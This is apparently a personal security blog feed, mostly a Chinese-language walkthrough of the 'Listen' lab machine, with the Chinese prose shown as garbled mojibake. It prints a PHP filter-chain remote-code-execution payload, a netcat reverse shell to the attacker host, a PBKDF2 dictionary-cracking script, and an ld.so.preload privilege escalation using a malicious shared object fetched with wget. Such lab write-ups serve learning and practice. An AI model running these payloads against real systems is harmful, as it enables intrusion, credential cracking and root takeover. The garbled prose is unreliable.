2025Âπ¥1Êúà22Êó•„ÄÄÊú¨„Éó„É≠„Ç∏„Çß„ÇØ„Éà„ÅÆÈñãÁô∫„ÅØ‰∏ÄÊó¶„Åì„Åì„ÅßÁµÇ‰∫Ü„Åß„Åô„ÄÇÊ≠£Âºè„Å´„Éó„É≠„Ç∏„Çß„ÇØ„Éà„Åå2Êúà„Å´ÂÖ¨Èñã„Åï„Çå„ÇãÂâç„Å´„ÄÅ„ÉÜ„Çπ„ÉàÈÉ®ÂàÜ„ÇíÂøÖ„ÅöÊï¥ÁêÜ„Åó„Å¶„Åè„Å†„Åï„ÅÑ„ÄÇ‚Äî‚ÄîÈñãÁô∫„ÉÅ„Éº„É†„ÄÄ„Ç¢„ÉÄ„Ç∑
                        
```

ÂâçÈù¢Âú®È¶ñÈ°µÂèØ‰ª•ÁúãÂà∞ÊòØÁî®doÂáΩÊï∞‰º†ÂèÇÔºåÊâÄ‰ª•Êàë‰ª¨ÊµãËØï‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.137/test.php?do=../../../etc/passwd
&lt;h1&gt;test&lt;/h1&gt;
self-hacking!                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.137/tools.php?do=../../../etc/passwd
&lt;h1&gt;tools&lt;/h1&gt;
 
                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.137/pp.php?do=../../../etc/passwd
&lt;h1&gt;test&lt;/h1&gt;
try
                   
```

‰∏§‰∏™ÊúâÂèçÂ∫îÔºåtoolsÊ≤°ÂèçÂ∫îÔºåÊàëÁî®ÁöÑÊòØpp.php

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.137/pp.php?do=php://filter/convert.base64-encode/resource=../../../../etc/passwd
&gt; 
&lt;h1&gt;test&lt;/h1&gt;
trycm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTAxOjEwMjpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLW5ldHdvcms6eDoxMDI6MTAzOnN5c3RlbWQgTmV0d29yayBNYW5hZ2VtZW50LCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXJlc29sdmU6eDoxMDM6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCm1lc3NhZ2VidXM6eDoxMDQ6MTEwOjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCnNzaGQ6eDoxMDU6NjU1MzQ6Oi9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgp3ZWxjb21lOng6MTAwMToxMDAxOjovaG9tZS93ZWxjb21lOi9iaW4vc2gKbXlzcWw6eDoxMDY6MTEzOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQo=
                                                          
```

ÊúâÂõûÊòæÔºåÊâÄ‰ª•Êµã‰∏Ä‰∏ãphp filter

```
http://192.168.205.137/pp.php?do=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=id
```

![image-20250331190958726](https://7r1umphk.github.io/image/20250331190958775.png)

Âºπshell

```
http://192.168.205.137/pp.php?do=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=nc%20192.168.205.128%208888%20-e%20/bin/bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888                                
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.137] 50510
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 3. Ëé∑ÂæóÁ®≥ÂÆöÁöÑ Shell

Ëé∑ÂèñÂèçÂêë shell ÂêéÔºåÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Ëé∑ÂæóÁ®≥ÂÆöÁöÑ‰∫§‰∫íÂºè TTY shellÔºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.ÊèêÊùÉ

```
www-data@listen:~/html/wordpress$ ls -al
total 60
drwxr-xr-x 2 www-data www-data 4096 Feb  1 21:51 .
drwxr-xr-x 3 root     root     4096 Jan  7 23:52 ..
-rw-r--r-- 1 root     root       92 Feb  1 11:13 .2024_12_25_project_web_login_password.bak
-rw-r--r-- 1 root     root      228 Feb  1 09:50 README.md
-rw-r--r-- 1 root     root     1783 Feb  1 09:33 album_1.php
-rw-r--r-- 1 root     root     2004 Feb  1 09:32 album_2.php
-rw-r--r-- 1 root     root     1861 Feb  1 09:31 album_3.php
-rw-r--r-- 1 root     root     1781 Feb  1 09:30 album_4.php
-rw-r--r-- 1 root     root     2057 Feb  1 09:26 album_5.php
-rw-r--r-- 1 root     root     2359 Feb  1 09:12 home.php
-rw-r--r-- 1 root     root      315 Feb  1 09:07 index.php
-rw-r--r-- 1 root     root      219 Feb  1 21:48 pp.php
-rw-r--r-- 1 root     root     3972 Feb  1 09:23 styles.css
-rw-r--r-- 1 root     root      675 Feb  1 21:51 test.php
-rw-r--r-- 1 root     root      153 Feb  1 09:37 tools.php
www-data@listen:~/html/wordpress$ cat .2024_12_25_project_web_login_password.bak
pbkdf2:sha256:50000:flower:0916690d7bc2f92a0e1f1640ce7ee22e988843323efb8c8e43064eafed92b028
```

ÁúãÊ†∑Â≠êË¶ÅÁ†¥Ëß£Ëøô‰∏™hash

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat tmp.py
import hashlib
import binascii
from concurrent.futures import ProcessPoolExecutor, as_completed
from tqdm import tqdm

def pbkdf2_sha256(password, salt, iterations=50000, dklen=32):
    '''‰ΩøÁî®PBKDF2-HMAC-SHA256ÁÆóÊ≥ïËÆ°ÁÆóÂìàÂ∏å'''
    return hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt.encode('utf-8'), iterations, dklen)

def check_password(password_chunk, target_hash, salt, iterations):
    '''Ê£ÄÊü•ÁªôÂÆöÂØÜÁ†ÅÂùó‰∏≠ÁöÑÊØè‰∏™ÂØÜÁ†ÅÊòØÂê¶ÂåπÈÖçÁõÆÊ†áÂìàÂ∏å'''
    results = []
    for password in tqdm(password_chunk, desc='Processing chunk', unit='passwords'):
        password = password.strip()
        hashed_password = pbkdf2_sha256(password, salt, iterations)
        if binascii.hexlify(hashed_password).decode() == target_hash:
            results.append(password)
    return results

def crack_pbkdf2_hash(target_hash, salt, iterations=50000, dictionary_file='/usr/share/wordlists/rockyou.txt'):
    '''Â∞ùËØïÈÄöËøáÂ≠óÂÖ∏ÊîªÂáªÁ†¥Ëß£PBKDF2ÂìàÂ∏å'''
    chunk_size = 1000  # ÊØè‰∏™ËøõÁ®ãÂ§ÑÁêÜÁöÑÂØÜÁ†ÅÊï∞Èáè
    passwords = []
    with open(dictionary_file, 'r', encoding='utf-8', errors='ignore') as file:
        while True:
            password_chunk = list(islice(file, chunk_size))
            if not password_chunk:
                break
            passwords.append(password_chunk)

    with ProcessPoolExecutor() as executor:
        futures = [executor.submit(check_password, chunk, target_hash, salt, iterations) for chunk in passwords]
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(f'ÊâæÂà∞ÂØÜÁ†Å: {result}')
                return result
    print('Â≠óÂÖ∏‰∏≠Ê≤°ÊúâÊâæÂà∞ÂåπÈÖçÁöÑÂØÜÁ†Å')
    return None

if __name__ == '__main__':
    from itertools import islice
  
    target_hash = '0916690d7bc2f92a0e1f1640ce7ee22e988843323efb8c8e43064eafed92b028'
    salt = 'flower'
  
    crack_pbkdf2_hash(target_hash, salt)
                                                       
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ python3 tmp.py
ÊâæÂà∞ÂØÜÁ†Å: ['roseflower']
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ grep -r -w -n 'roseflower' /usr/share/wordlists/rockyou.txt                            
122049:roseflower
                                   
```

ËøòÊå∫Âêé

```
www-data@listen:~/html/wordpress$ ls -la /home/
total 12
drwxr-xr-x  3 root    root    4096 Jan  7 23:16 .
drwxr-xr-x 18 root    root    4096 Jan  7 21:50 ..
drwx------  2 welcome welcome 4096 Feb  1 11:10 welcome
www-data@listen:~/html/wordpress$ su - welcome
Password: 
$ id                                                                                                                                 
uid=1001(welcome) gid=1001(welcome) groups=1001(welcome)
```

ÁªßÁª≠

```
welcome@listen:~$ ls -al
total 20
drwx------ 2 welcome welcome 4096 Feb  1 11:10 .
-rw-r--r-- 1 root    root      11 Feb  1 11:10 .-
drwxr-xr-x 3 root    root    4096 Jan  7 23:16 ..
-rw------- 1 welcome welcome   69 Feb  1 07:13 .bash_history
-rw-r--r-- 1 root    root      33 Jan  7 23:18 user.txt
welcome@listen:~$ cat .bash_history
sudo -l
cat /etc/passwd
poweroff
ls
whoami
cd /root
whoami
su - root
welcome@listen:~$ sudo -l
[sudo] password for welcome: 
Sorry, user welcome may not run sudo on listen.
welcome@listen:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/touch
/usr/bin/su
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

/usr/bin/touchÊòØÂ§öÁöÑÔºåÊâæ‰∏Ä‰∏ãÊÄé‰πàÊèêÊùÉÂêßÔºåÊâæÂçäÂ§©‰πüÊâæ‰∏çÂà∞ÔºåÊàëÂ∞±Á≠âÁæ§uÁöÑwp‰∫Ü

![image-20250331191023675](https://7r1umphk.github.io/image/20250331191023738.png)

Ëøá‰øÆÊîπ /etc/ld.so.preload Êñá‰ª∂ÂÆûÁé∞Ëé∑Âæó root ÊùÉÈôêÔºåÊàë‰ª¨Ë∑üÁùÄÂÆûÁé∞‰∏Ä‰∏ã

Êü•Áúã‰∏Ä‰∏ãtouchÂëΩ‰ª§ÁöÑsoÁöÑË∑üË∏™ÊµÅ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ strace touch 2&gt;&amp;1 | grep -Pi 'open|access|no such file'
strace: Symbol `_UPT_accessors' has different size in shared object, consider re-linking
access('/etc/ld.so.preload', R_OK)      = -1 ENOENT (Ê≤°ÊúâÈÇ£‰∏™Êñá‰ª∂ÊàñÁõÆÂΩï)
openat(AT_FDCWD, '/etc/ld.so.cache', O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, '/lib/x86_64-linux-gnu/libc.so.6', O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, '/usr/lib/locale/locale-archive', O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, '/usr/share/locale/locale.alias', O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, '/usr/share/locale/zh_CN.UTF-8/LC_MESSAGES/coreutils.mo', O_RDONLY) = -1 ENOENT (Ê≤°ÊúâÈÇ£‰∏™Êñá‰ª∂ÊàñÁõÆÂΩï)
openat(AT_FDCWD, '/usr/share/locale/zh_CN.utf8/LC_MESSAGES/coreutils.mo', O_RDONLY) = -1 ENOENT (Ê≤°ÊúâÈÇ£‰∏™Êñá‰ª∂ÊàñÁõÆÂΩï)
openat(AT_FDCWD, '/usr/share/locale/zh_CN/LC_MESSAGES/coreutils.mo', O_RDONLY) = 3
openat(AT_FDCWD, '/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache', O_RDONLY|O_CLOEXEC) = 3
```

/etc/ld.so.preload ÊòØÁº∫Â§±ÁöÑÔºåÊàë‰ª¨ÂéªÈù∂Êú∫ÁúãÁúã

```
welcome@listen:~$ ls -la /etc/ld.so.preload                                                                                          
ls: cannot access '/etc/ld.so.preload': No such file or directory   
```

ÈÇ£ÁÆÄÂçï‰∫ÜÔºåÊàë‰ª¨ÂéªÂàõÂª∫‰∏Ä‰∏™ÊÅ∂ÊÑèsoÂ∞±Â•Ω‰∫Ü

üîóhttps://book.hacktricks.wiki/zh/linux-hardening/privilege-escalation/write-to-root.html

Âú®kaliÂàõÂª∫‰∏Ä‰∏™ÊÅ∂ÊÑèso

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat exp.c 
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;  // ÂåÖÂê´ unlink(), setuid(), setgid() Á≠âÂáΩÊï∞

void _init() {
    // Âà†Èô§ /etc/ld.so.preload Êñá‰ª∂
    unlink('/etc/ld.so.preload');

    // ÊèêÂçáÊùÉÈôêÔºåËÆæÁΩÆ‰∏∫ root Áî®Êà∑ÂíåÁªÑ
    setgid(0);    // ËÆæÁΩÆ‰∏∫ root ÁªÑ
    setuid(0);    // ËÆæÁΩÆ‰∏∫ root Áî®Êà∑

    // ÊâßË°å shellÔºàÂ¶ÇÈúÄË¶ÅÔºâ
    system('/bin/bash');
}
   
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ gcc -fPIC -shared -o exp.so exp.c -nostartfiles
                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.205.141 - - [03/Feb/2025 17:31:20] 'GET /exp.so HTTP/1.1' 200 -
welcome@listen:/tmp$ wget 192.168.205.128/exp.so
--2025-02-03 04:31:04--  http://192.168.205.128/exp.so
Connecting to 192.168.205.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14152 (14K) [application/octet-stream]
Saving to: ‚Äòexp.so‚Äô

exp.so                                                       0%[                                                                       exp.so                                                     100%[========================================================================================================================================&gt;]  13.82K  --.-KB/s    in 0s    

2025-02-03 04:31:04 (91.0 MB/s) - ‚Äòexp.so‚Äô saved [14152/14152]

welcome@listen:/tmp$ chmod +x exp.so 
welcome@listen:/tmp$ umask 000
welcome@listen:/tmp$ touch /etc/ld.so.preload
welcome@listen:/tmp$ ls -al /etc/ld.so.preload
-rw-rw-rw- 1 root root 0 Feb  3 04:31 /etc/ld.so.preload
welcome@listen:/tmp$ echo '/tmp/exp.so' &gt; /etc/ld.so.preload
welcome@listen:/tmp$ touch test
root@listen:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1001(welcome)
```

&lt;!-- ##{'timestamp':1738580133}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Listen.html</guid><pubDate>Mon, 03 Feb 2025 10:55:33 +0000</pubDate></item><item><title>Êñ∞Âπ¥Âø´‰πêÔºÅ</title><link>https://7r1UMPHK.github.io/post/xin-nian-kuai-le-%EF%BC%81.html</link><description># Êñ∞Âπ¥Âø´‰πêÔºÅ

Êñ∞ÁöÑ‰∏ÄÂπ¥ÔºåÊÑø‰Ω†Â¶Ç‰∏úÈ£éÁ†¥Êµ™Ôºå‰∫ã‰∏öËí∏Ëí∏Êó•‰∏äÔºåÁîüÊ¥ªÁæéÊª°Â¶ÇÊÑè„ÄÇÊÑø‰Ω†ÂøÉÊÉ≥‰∫ãÊàêÔºåÁ¨ëÂÆπÂ∏∏ÂºÄÔºåÊâÄÊúâÁöÑÂä™ÂäõÈÉΩËÉΩËøéÊù•‰∏∞Á°ïÁöÑÊûúÂÆû„ÄÇÊÑøÊñ∞ÁöÑ‰∏ÄÂπ¥ÔºåÂ∏¶Áªô‰Ω†Êõ¥Â§öÁöÑÊú∫‰ºö‰∏éÊåëÊàòÔºåËÆ©‰Ω†ÂèòÂæóÊõ¥Âä†ÂùöÈüß„ÄÅÊõ¥Âä†Á≤æÂΩ©ÔºÅÊñ∞Êò•Âø´‰πêÔºå‰∏á‰∫ãÂ¶ÇÊÑèÔºÅ

&lt;!-- ##{'timestamp':1738136321}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/xin-nian-kuai-le-%EF%BC%81.html</guid><pubDate>Wed, 29 Jan 2025 07:38:41 +0000</pubDate></item><item><title>ÂèãÈìæ</title><link>https://7r1UMPHK.github.io/link.html</link><description>&lt;!-- ##{'script':'&lt;script src='https://7r1umphk.github.io/plugins/FriendLinks.js'&gt;&lt;/script&gt;'}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/link.html</guid><pubDate>Fri, 27 Jun 2025 09:29:38 +0000</pubDate></item><item><title>about</title><link>https://7r1UMPHK.github.io/about.html</link><description>

# üëã ÂÖ≥‰∫éÊàë

![GitHub Ê¥ªË∑ÉÂõæ](https://ghchart.rshah.org/7r1umphk)

## üåü ‰∫∫ÁîüËΩ®Ëøπ

- ü•á ÊüêÁúÅÊäÄËÉΩÂ§ßËµõ **ÈÄö‰ø°ÊñπÂêë‰∏ÄÁ≠âÂ•ñ**
- üéì ÊüêÁü•ÂêçÂ§ß‰∏ìÈô¢Ê†°ÊØï‰∏ö
- üì° **HCIP-Datacom** ÊåÅËØÅ
- üìö Ê≠£Âú®Â§áËÄÉ **HCIE-Datacom**

## üíª ÊäÄÊúØÊ†à

- üêç PythonÔºàÂÖ•Èó®Êé¢Á¥¢Ôºâ
- üñ• BashÔºàÂÖ•Èó®ÂÆûË∑µÔºâ
- üì° DatacomÔºàHCIP Â∑≤ËøáÔºåHCIE Â§áËÄÉ‰∏≠Ôºâ
- ‚ú® JavaScriptÔºàÂÅ∂Â∞îÂ∞ùËØïÔºâ

# üìù ÂÖ≥‰∫éÊú¨Á´ô

Êú¨Á´ôÂßã‰∫é **2025/01/29**ÔºåÈááÁî® **GitHub Pages + gmeek** Êê≠Âª∫„ÄÇ
 ‰∏ªË¶ÅËÆ∞ÂΩïÂ≠¶‰π†ÂéÜÁ®ã‰∏é‰∏Ä‰∫õ‰∏™‰∫∫ÁªüËÆ°ÔºåÊó¢ÊòØÁªôËá™Â∑±ÁïôÊ°£Ôºå‰πüÂ∏åÊúõËÉΩÂØπ‰ªñ‰∫∫ÊúâÁÇπÂèÇËÄÉ‰ª∑ÂÄº„ÄÇ

## üí∞ ËøêË°åÊàêÊú¨

- **0 ÂÖÉ**ÔºàÂÆåÂÖ®ÊâòÁÆ°Âú® GitHubÔºâ

## üìÖ Á´ôÁÇπÂ§ß‰∫ãËÆ∞

| Êó•Êúü       | ÊîπÂä®/‰∫ã‰ª∂                                 |
| ---------- | ----------------------------------------- |
| 2023/01/29 | ‰ΩøÁî® GitHub Pages Êê≠Âª∫ gmeek ÂçöÂÆ¢         |
| ‚Ä¶          | ‰∏ÄÁ≥ªÂàóÁæéÂåñ‰∏éÂäüËÉΩË∞ÉÊï¥                      |
| 2025/06/26 | Âõ†Ë¥¶Âè∑‰∏¢Â§±ÔºåÈáçÂºÄ‰∫é **7r1umphk.github.io** |

